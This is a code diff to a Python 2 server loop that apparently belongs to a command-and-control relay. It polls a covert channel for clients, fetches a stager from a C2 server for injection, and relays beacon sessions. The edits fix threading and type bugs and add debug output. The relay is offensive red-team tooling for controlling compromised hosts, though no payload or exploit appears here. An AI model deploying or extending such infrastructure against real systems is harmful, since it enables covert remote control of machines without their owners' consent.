@@ -34,11 +34,11 @@ def task_loop(beacon_obj):
 	# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
 	# Poll covert channel for 'READY2INJECT' message from client
 	#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
-	# if args.verbose:
-	#       print commonUtils.color("Client ready to recieve stager")
+	if config.verbose:
+		print commonUtils.color("Client ready to recieve stager")
 
 	# Let's get the stager from the c2 server
-	stager_status = configureStage.loadStager(beacon_obj.sock)
+	stager_status = configureStage.loadStager(beacon_obj)
 
 	if stager_status != 0:
 		# Something went horribly wrong
@@ -73,7 +73,7 @@ def task_loop(beacon_obj):
 
 		# Let's relay this response to the c2 server
 		establishedSession.relayResponse(beacon_obj.sock, b_response_data)
-		sleep(beacon_obj.block_time / 100)  # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
+		sleep(int(beacon_obj.block_time) / 100)  # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
 
 def main():
 	# Argparse for certain options
@@ -114,6 +114,9 @@ def main():
 	while True:
 		try:
 			# TODO: add logic to check for new beacons here that will return a beacon.Beacon object
+			if config.debug:
+				print commonUtils.color("Checking for new clients", status=False,
+										yellow=True)
 			new_client = commonUtils.get_new_clients()
 			if new_client is not 0:
 				new_client_obj = beacon.Beacon()
@@ -124,10 +127,14 @@ def main():
 				try:
 					beacon_obj = new_beacon_queue.get()
 					print commonUtils.color("Attempting to start session for beacon {}").format(beacon_obj.beacon_id)
-					t = threading.Thread(target=task_loop, args=(beacon_obj))
+					t = threading.Thread(target=task_loop, args=(beacon_obj,))
 					t.daemon=True
-
+					t.start()
+					if config.debug:
+						print commonUtils.color("Thread started", status=False,
+												yellow=True)
 					# Restart this loop
+					pass
 				except Exception as e:
 					print commonUtils.color("Error occured while attempting to start beacon {}", status=False, warning=True).format(beacon_obj.beacon_id)
 					print commonUtils.color("Exception is: {}", status=False, warning=True).format(e)
